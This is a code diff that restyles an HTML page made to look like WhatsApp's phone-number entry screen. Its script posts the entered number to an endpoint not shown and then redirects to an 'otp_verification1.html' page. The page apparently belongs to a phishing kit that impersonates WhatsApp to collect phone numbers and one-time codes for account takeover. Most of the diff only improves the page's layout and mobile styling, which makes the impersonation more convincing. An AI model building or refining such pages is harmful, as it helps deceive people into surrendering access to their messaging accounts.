@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Enter Phone Number</title>
   <style>
     body {
@@ -13,22 +14,25 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      height: 100vh;
-      position: relative;
+      justify-content: flex-start;
+      min-height: 100vh;
+      padding-top: 60px;
+      box-sizing: border-box;
     }
 
     h2 {
-      font-size: 26px;
+      font-size: 1.6rem;
       margin-bottom: 10px;
       font-weight: bold;
+      text-align: center;
     }
 
     p {
       color: #bcbcbc;
-      font-size: 14px;
+      font-size: 0.95rem;
       text-align: center;
-      margin: 0 30px 20px;
+      margin: 0 20px 20px;
+      line-height: 1.5;
     }
 
     .highlight {
@@ -36,45 +40,49 @@
       cursor: pointer;
     }
 
-    .dropdown, .input-row {
-      width: 80%;
-      max-width: 350px;
-      margin: 10px 0;
+    .dropdown,
+    .input-row {
+      width: 90%;
+      max-width: 400px;
+      margin: 10px auto;
     }
 
-    select, input {
+    select,
+    input {
       width: 100%;
       background-color: transparent;
       border: none;
       border-bottom: 2px solid #25D366;
-      padding: 10px 5px;
-      font-size: 16px;
+      padding: 12px 6px;
+      font-size: 1rem;
       color: white;
       outline: none;
+      box-sizing: border-box;
     }
 
     .input-row {
       display: flex;
       gap: 10px;
+      align-items: center;
     }
 
     .input-row input:first-child {
-      width: 70px;
+      width: 80px;
       flex-shrink: 0;
+      text-align: center;
     }
 
     .submit-btn {
-      position: absolute;
-      bottom: 30px;
-      width: 80%;
-      max-width: 300px;
+      margin-top: 40px;
+      width: 90%;
+      max-width: 320px;
       background-color: #25D366;
       color: black;
       padding: 14px 0;
       text-align: center;
       border-radius: 30px;
       font-weight: bold;
-      font-size: 16px;
+      font-size: 1rem;
       cursor: pointer;
       border: none;
     }
@@ -82,13 +90,32 @@
     .submit-btn:hover {
       background-color: #1ebe5d;
     }
+
+    @media (max-width: 400px) {
+      h2 {
+        font-size: 1.4rem;
+      }
+
+      p {
+        font-size: 0.85rem;
+        margin: 0 10px 20px;
+      }
+
+      .submit-btn {
+        font-size: 0.95rem;
+      }
+
+      input, select {
+        font-size: 0.95rem;
+      }
+    }
   </style>
 </head>
 <body>
 
 <h2>Enter your phone number</h2>
 <p>
-  WhatsApp will need to verify your phone number. <br>
+  WhatsApp will need to verify your phone number.<br />
   Carrier charges may apply. <span class="highlight">What’s my number?</span>
 </p>
 
@@ -136,12 +163,10 @@
     })
             .then(res => res.ok ? res.text() : Promise.reject("Submission failed"))
             .then(() => {
-              // alert("Phone number submitted successfully!");
               window.location.href = "otp_verification1.html";
             })
             .catch(err => {
               console.error(err);
-              // alert("Error submitting phone number.");
             });
   }
 </script>
